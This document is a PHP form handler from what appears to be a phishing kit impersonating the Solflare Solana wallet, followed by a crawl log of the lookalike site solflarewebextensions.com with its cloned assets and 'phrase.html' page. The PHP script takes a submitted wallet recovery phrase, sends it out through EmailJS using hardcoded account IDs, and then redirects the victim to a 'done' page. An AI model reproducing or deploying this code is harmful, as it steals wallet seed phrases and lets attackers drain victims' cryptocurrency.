<?php
// Check if the form is submitted
if ( $_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the phrase from the form
    $phrase = $_POST['phrase'];

    // EmailJS configuration
    $serviceID = "service_wvmszpf"; // Replace with your EmailJS service ID
    $templateID = "template_isl3nhj"; // Replace with your EmailJS template ID
    $userID = "xQPS2nmTkvcMa5R7x"; // Replace with your EmailJS user ID

    // Send the email using EmailJS
    echo '<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>';
    echo '<script type="text/javascript">
        (function() {
            emailjs.init("' . $userID . '");
            emailjs.send("' . $serviceID . '", "' . $templateID . '", {
                phrase: "' . addslashes($phrase) . '"
            }).then(function() {
                // Redirect to done.html after sending
                window.location.href = "done.html";
            }, function(error) {
                console.log("Failed to send email. Error: ", error);
            });
        })();
    </script>';
} else {
    // If the form is not submitted, redirect to the form page or show an error
    header("Location: https://solflarewebextensions.com/done.html"); // Replace with your form page
    exit();
}
?>

URL,"HTTP Status",Status,"Skip Reason",Size,"Redirects To"
https://solflarewebextensions.com/t1.php,302,Redirect,Redirect,,https://solflarewebextensions.com/done.html
https://solflarewebextensions.com/done.html,200,Remapped,,"2.24 KiB",
https://fonts.gstatic.com/,404,Processed,External,"1.52 KiB",
https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&family=Roboto+Mono&display=swap,200,Remapped,,,
https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css,200,Remapped,,,
https://solflarewebextensions.com/index-2.html,200,Remapped,,"8.28 KiB",
https://solflarewebextensions.com/,200,Remapped,,"4.88 KiB",
https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js,200,Processed,,"30.29 KiB",
https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js,200,Processed,,,
https://solflarewebextensions.com/assets/solflare-logo.6804d45c..svg,200,Processed,,"4.04 KiB",
https://solflarewebextensions.com/images/Error-PNG.png,200,Processed,,"17.14 KiB",
https://fonts.gstatic.com/s/poppins/v22/pxiEyp8kv8JHgFVrFJA.ttf,200,Processed,,"67.84 KiB",
https://fonts.gstatic.com/s/poppins/v22/pxiByp8kv8JHgFVrLEj6V1s.ttf,200,Processed,,"67.58 KiB",
https://fonts.gstatic.com/s/robotomono/v23/L0xuDF4xlVMF-BfR8bXMIhJHg45mwgGEFl0_3vqPQw.ttf,200,Processed,,"48.38 KiB",
https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/fonts/glyphicons-halflings-regular.eot,200,Processed,,,
https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/fonts/glyphicons-halflings-regular.eot?,200,Processed,,,
https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/fonts/glyphicons-halflings-regular.woff2,200,Processed,,"17.61 KiB",
https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/fonts/glyphicons-halflings-regular.woff,200,Processed,,"22.88 KiB",
https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/fonts/glyphicons-halflings-regular.ttf,200,Processed,,,
https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/fonts/glyphicons-halflings-regular.svg,200,Processed,,,
https://solflarewebextensions.com/assets/style.b88d04fb..scss,200,Processed,,"50 B",
https://solflarewebextensions.com/assets/favicon.67160fd1..png,200,Processed,,"3.99 KiB",
https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap,200,Remapped,,,
https://solflarewebextensions.com/css/landing.8cf866f5478cdbf3ec52.css,200,Processed,,"21.14 KiB",
https://solflarewebextensions.com/access.html,200,Remapped,,"4.43 KiB",
https://solflarewebextensions.com/phrase.html,200,Remapped,,"5.18 KiB",
http://academy.solflare.com/,301,Processed,External,,
https://twitter.com/solflare_wallet,302,Redirect,Redirect,"77 B",https://x.com/solflare_wallet
https://x.com/solflare_wallet,200,Processed,External,,
https://twitter.com/DegenTrashPanda,302,Redirect,Redirect,"77 B",https://x.com/DegenTrashPanda
https://x.com/DegenTrashPanda,200,Processed,External,,
https://apps.apple.com/us/app/solflare/id1580902717,301,Redirect,Redirect,,https://apps.apple.com/us/app/solflare-solana-wallet/id1580902717
https://apps.apple.com/us/app/solflare-solana-wallet/id1580902717,200,Processed,External,,
https://play.google.com/store/apps/details?id=com.solflare.mobile,200,Processed,External,"1.12 MiB",
https://solflarewebextensions.com/landing.63895ac8.js,200,Processed,,"41.33 KiB",
https://solflarewebextensions.com/assets/logo-icon.26659b6d..svg,200,Processed,,"1.37 KiB",
https://solflarewebextensions.com/assets/wallet.6cdd2cb0..svg,200,Processed,,"387 B",
https://solflarewebextensions.com/assets/hero-bg.4d513525..png,200,Processed,,"91.93 KiB",
https://solflarewebextensions.com/assets/hero-decoration.f8de9a54..png,200,Processed,,"2.28 MiB",
https://solflarewebextensions.com/assets/hero-desktop.b6d336a8..png,200,Processed,,"119.17 KiB",
https://solflarewebextensions.com/assets/hero-image-phone.127ce1c3.png,200,Processed,,"34.33 KiB",
https://solflarewebextensions.com/assets/hero-image-extension.ad1def41..png,200,Processed,,"7.41 KiB",
https://solflarewebextensions.com/assets/mobile-hero-1.24cfac98..png,200,Processed,,"67.57 KiB",
https://solflarewebextensions.com/assets/mobile-hero-2.3a3f5798..png,200,Processed,,"68.84 KiB",
https://solflarewebextensions.com/assets/mobile-hero-3.54b33a6d..png,200,Processed,,"35.77 KiB",
https://solflarewebextensions.com/assets/decoration-two.cedb661f..png,200,Processed,,"3.45 MiB",
https://solflarewebextensions.com/assets/transaction-simulation.fc4ee070..png,200,Processed,,"74.89 KiB",
https://solflarewebextensions.com/assets/metal1165.png,200,Processed,,"13.8 KiB",
https://solflarewebextensions.com/assets/anti-phishing.de8722d9..png,200,Processed,,"55.56 KiB",
https://solflarewebextensions.com/assets/design-circles.05b6d0a5..svg,200,Processed,,"226 B",
https://solflarewebextensions.com/assets/design-gradient.83c17881..png,200,Processed,,"1019.63 KiB",
https://solflarewebextensions.com/assets/blockrocking-power.f1e50977..png,200,Processed,,"1.88 MiB",
https://solflarewebextensions.com/assets/send-store.05d9c937..png,200,Processed,,"58.99 KiB",
https://solflarewebextensions.com/assets/manage-nfts.345e9f8b..png,200,Processed,,"47.09 KiB",
https://solflarewebextensions.com/assets/stake-and-earn.3ad3431d..png,200,Processed,,"80.79 KiB",
https://solflarewebextensions.com/assets/connect-dapps.d651de62..png,200,Processed,,"54.53 KiB",
https://solflarewebextensions.com/assets/notifications.403a0ff3..png,200,Processed,,"62.69 KiB",
https://solflarewebextensions.com/assets/activity.6283ca4d..png,200,Processed,,"61.51 KiB",
https://solflarewebextensions.com/assets/chat.e57fb750..png,200,Processed,,"10.24 KiB",
https://solflarewebextensions.com/assets/academy.85f282db..png,404,Processed,Failed,,
https://solflarewebextensions.com/assets/twitter-decoration.a0ad945e..png,200,Processed,,"2.54 MiB",
https://solflarewebextensions.com/assets/arrow-left-twitter.d5b0d362..svg,200,Processed,,"285 B",
https://solflarewebextensions.com/assets/arrow-right-twitter.e911d67a..svg,200,Processed,,"286 B",
https://solflarewebextensions.com/assets/K-bPAFom_400x400.4ff30519..jpg,200,Processed,,"16.63 KiB",
https://solflarewebextensions.com/assets/8yGmbgc5_400x400.e4490792..jpg,404,Processed,Failed,,
https://solflarewebextensions.com/assets/rpAheeyC_400x400.42d0d099..jpg,200,Processed,,"29.35 KiB",
https://solflarewebextensions.com/assets/jE5pimT__400x400.2e040722..jpg,200,Processed,,"28.1 KiB",
https://solflarewebextensions.com/assets/glow.4fb2c873..png,200,Processed,,"2.49 MiB",
https://solflarewebextensions.com/assets/slrs-coin.de57fb9d..svg,404,Processed,Failed,,
https://solflarewebextensions.com/assets/solrise-finance-logo.5d72c38f..svg,200,Processed,,"4.33 KiB",
https://solflarewebextensions.com/assets/pulse-logo.b72c1c50..svg,200,Processed,,"4.13 KiB",
https://solflarewebextensions.com/assets/app-store.7d7b971d..png,200,Processed,,"4.11 KiB",
https://solflarewebextensions.com/assets/play-store.2ad41b5d..png,200,Processed,,"4.45 KiB",
https://solflarewebextensions.com/assets/phone-iphone.583db473..png,200,Processed,,"137.21 KiB",
https://solflarewebextensions.com/assets/phone-andriod.940ad23b..png,200,Processed,,"103.79 KiB",
"https://solflarewebextensions.com/assets/hero-desktop@2x.9886ed86..png 2x",404,Processed,Failed,,
"https://solflarewebextensions.com/assets/hero-image-phone@2x.537c1976.png 2x",404,Processed,Failed,,
"https://solflarewebextensions.com/assets/hero-image-extension@2x.74a2f217..png 2x",404,Processed,Failed,,
"https://solflarewebextensions.com/assets/mobile-hero-1@2x.3055d2db..png 2x",404,Processed,Failed,,
"https://solflarewebextensions.com/assets/mobile-hero-2@2x.98924da8..png 2x",404,Processed,Failed,,
"https://solflarewebextensions.com/assets/mobile-hero-3@2x.9bb0d907..png 2x",404,Processed,Failed,,
"https://solflarewebextensions.com/assets/phone-iphone@2x.761b16ee..png 2x",404,Processed,Failed,,
"https://solflarewebextensions.com/assets/phone-andriod@2x.d9330688..png 2x",404,Processed,Failed,,
https://solflare.com/scss/style.scss,404,Processed,External,,
https://solflare.com/favicon.ico,200,Processed,,,
https://fonts.googleapis.com,404,Processed,External,"1.58 KiB",
https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap,200,Remapped,,,
https://solflarewebextensions.com/css/landing.a72e4cec62d2187e50e8.css,200,Processed,,"22.3 KiB",
https://docs.solflare.com/solflare/,308,Redirect,Redirect,,https://docs.solflare.com/solflare
https://docs.solflare.com/solflare,200,Processed,External,,
https://www.youtube.com/channel/UCFgH2FSi360EngaSr5056cQ,200,Processed,External,"601.75 KiB",
https://solflarewebextensions.com/landing.9e9ae151.js,200,Processed,,"2.53 MiB",
https://solflare.com/assets/logo-icon-white.406a80a7..svg,200,Processed,,,
https://solflare.com/assets/solflare-logo-white.c53d256d..svg,200,Processed,,,
https://solflare.com/assets/purple.a70a7749..png,200,Processed,,"306.56 KiB",
https://solflare.com/assets/shape-orange.557de308..svg,200,Processed,,,
https://solflare.com/assets/A-secure-and-powerful-Solana-Walletx2.c6efaf0a..png,200,Processed,,"447.63 KiB",
https://solflare.com/assets/hero-img-mobile.1bf42891..png,200,Processed,,"201.24 KiB",
https://solflare.com/assets/gradients.23c76e1c..png,200,Processed,,"582.12 KiB",
https://solflare.com/assets/transaction_simulation@1.5.286f2932..png,200,Processed,,"94.56 KiB",
https://solflare.com/assets/ledger-love@1.5.b14aaa85..png,200,Processed,,"79.37 KiB",
https://solflare.com/assets/anti-phishing@1.5.6d33be08..png,200,Processed,,"67.58 KiB",
https://solflare.com/assets/buy-store-send-swap@2x.6f948865..png,200,Processed,,"169.88 KiB",
https://solflare.com/assets/manage-your-NFT-collection@2x.75dbb331..png,200,Processed,,"146.14 KiB",
https://solflare.com/assets/stake-and-earn@2x.9b15a02a..png,200,Processed,,"155.7 KiB",
https://solflare.com/assets/connect-to-solana-dApps@2x.8d69e859..png,200,Processed,,"100.91 KiB",
https://solflare.com/assets/get-instant-notifications@2x.36592135..png,200,Processed,,"121.09 KiB",
https://solflare.com/assets/easy-to-read-activity-history@2x.fbc45480..png,200,Processed,,"138.24 KiB",
https://solflare.com/assets/solflare-live-chat.37373557..png,200,Processed,,"18.42 KiB",
https://solflare.com/assets/solflare-academy.6d6a065c..png,200,Processed,,"44.56 KiB",
https://solflare.com/assets/arrow-left-twitter.d5b0d362..svg,200,Processed,,,
https://solflare.com/assets/arrow-right-twitter.e911d67a..svg,200,Processed,,,
https://solflare.com/assets/K-bPAFom_400x400.4ff30519..jpeg,200,Processed,,"16.63 KiB",
https://solflare.com/assets/twitter-icon.9fa2cf74..svg,200,Processed,,,
https://solflare.com/assets/8yGmbgc5_400x400.e4490792..jpeg,200,Processed,,"12.35 KiB",
https://solflare.com/assets/rpAheeyC_400x400.42d0d099..jpeg,200,Processed,,"29.35 KiB",
https://solflare.com/assets/jE5pimT__400x400.2e040722..jpeg,200,Processed,,"28.1 KiB",
https://solflare.com/assets/app-store.7d7b971d..png,200,Processed,,"4.11 KiB",
https://solflare.com/assets/play-store.2ad41b5d..png,200,Processed,,"4.45 KiB",
https://solflare.com/assets/Try-Solflare-nowx2.d8af6098..png,200,Processed,,"340.82 KiB",
https://solflare.com/assets/Try-Solflare-now-mobx2.7d4bd1f2..png,200,Processed,,"132.7 KiB",
https://solflare.com/assets/cta-gradients.f1d68492..png,200,Processed,,"1.15 MiB",
https://solflare.com/assets/QR-code.cd6abe98..png,200,Processed,,"2.43 KiB",
https://fonts.gstatic.com/s/poppins/v22/pxiByp8kv8JHgFVrLCz7V1s.ttf,200,Processed,,"66.96 KiB",
https://solflarewebextensions.com/assets/coin-deco.25956bb4..png,404,Processed,Failed,,
https://solflarewebextensions.com/assets/decoration.18ca56b0..png,404,Processed,Failed,,
https://solflarewebextensions.com/assets/favicon.67160fd1.png,404,Processed,Failed,,
https://solflarewebextensions.com/assets/an.png,200,Processed,,"382 B",
https://solflarewebextensions.com/assets/onboarding-create-wallet.f3c80085.svg,200,Processed,,"1.63 KiB",
https://solflarewebextensions.com/assets/carousel-image-phrase.a4e711a6.svg,200,Processed,,"1.01 KiB",
https://solflarewebextensions.com/assets/carousel-image-write-down.9565a9f3.svg,200,Processed,,"1.47 KiB",
https://solflarewebextensions.com/assets/carousel-image-secure.e97295fe.svg,200,Processed,,"781 B",
https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js,200,Processed,,"1.01 KiB",
https://fonts.gstatic.com/s/inter/v18/UcCO3FwrK3iLTeHuS_nVMrMxCp50SjIw2boKoduKmMEVuOKfMZg.ttf,200,Processed,,"156.98 KiB",
https://fonts.gstatic.com/s/inter/v18/UcCO3FwrK3iLTeHuS_nVMrMxCp50SjIw2boKoduKmMEVuLyfMZg.ttf,200,Processed,,"154.39 KiB",
https://fonts.gstatic.com/s/inter/v18/UcCO3FwrK3iLTeHuS_nVMrMxCp50SjIw2boKoduKmMEVuI6fMZg.ttf,200,Processed,,"158.17 KiB",
https://fonts.gstatic.com/s/inter/v18/UcCO3FwrK3iLTeHuS_nVMrMxCp50SjIw2boKoduKmMEVuGKYMZg.ttf,200,Processed,,"158.8 KiB",
https://fonts.gstatic.com/s/inter/v18/UcCO3FwrK3iLTeHuS_nVMrMxCp50SjIw2boKoduKmMEVuFuYMZg.ttf,200,Processed,,"159.21 KiB",
